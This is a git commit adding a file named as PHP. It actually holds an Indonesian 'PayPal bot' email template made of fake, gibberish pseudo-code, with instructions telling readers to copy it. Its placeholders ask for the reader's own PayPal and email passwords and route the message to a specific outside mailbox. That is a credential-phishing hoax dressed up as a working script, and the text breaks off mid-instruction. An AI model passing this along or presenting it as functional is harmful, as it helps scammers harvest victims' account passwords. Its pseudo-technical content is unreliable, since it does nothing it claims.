331cee6a0872f01f1f9786e0bab877b350debd41
mujiya1177 <50258875+mujiya1177@users.noreply.github.com>
2019-05-29 22:54:53 +0700

    Add files via upload

---
+++ sedop.php
@@ -0,0 +1,22 @@
+SUBJECT email: Bot–Paypal
+ISI email:
+
+content-Type:text/plain
+charset=us-ascii
+address000%%confirmation0e24.graffiti.com
+p38ylec00rm::s%%www.paypal.com%%
+xxxx@gmail.com.informsto%%www.paypal.com%%/viewdetails.asp?id?=Uxxxxxxxstart(retrieve>0
+verified(*value==float)
+password-paypal-anda%%www.paypal.com%%/view-number.aspid=11111#
+searchmsgend24hr
+%%www.paypal.com%%/view-masterpin.aspid=222#
+email-anda@gmail.com%%passmailverif=?password-email-anda
+searchmsgend24hrinklud##donyiskandar@yahoo.com
+send&&idR20034-tsa-0583#
+endofmsg
+================================================
+Silahkan anda copy DAHULU kode script tersebut di atas!!!!
+=============================================
+Keterangan (dari ke empat belas baris script diatas) yang terpenting adalah script dengan warna merah harus benar-benar anda perhatikan:
+
+1. Baris pertama jangan coba-coba
